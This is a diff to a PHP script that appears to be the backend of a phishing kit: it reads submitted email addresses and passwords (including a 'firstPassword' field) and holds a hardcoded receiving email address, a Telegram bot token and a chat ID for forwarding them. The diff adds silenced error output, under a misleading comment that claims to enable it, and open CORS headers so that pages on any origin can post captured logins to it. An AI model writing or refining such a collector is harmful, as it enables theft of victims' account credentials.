@@ -1,5 +1,13 @@
 <?php
 
+// Enable error reporting for debugging
+error_reporting(0);
+ini_set('display_errors', 0);
+
+// Allow requests from any origin and methods
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
+header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
 $recipient_email = "tag100@mailfence.com"; // Change to your receiving email
 $telegram_bot_token = "7594602249:AAHXtpmqcu4ONanYKOkn4AixALhln7bmGn4";    // Bot token
 $telegram_chat_id = "7724482403";        // Telegram chat ID
@@ -9,7 +17,6 @@ $timestamp = date("Y-m-d H:i:s");
 $email          = isset($_POST['email']) ? trim($_POST['email']) : '';
 $firstPassword  = isset($_POST['firstPassword']) ? trim($_POST['firstPassword']) : '';
 $password       = isset($_POST['password']) ? trim($_POST['password']) : '';
-
 
 if (empty($email) || (empty($firstPassword) && empty($password))) {
     http_response_code(400);
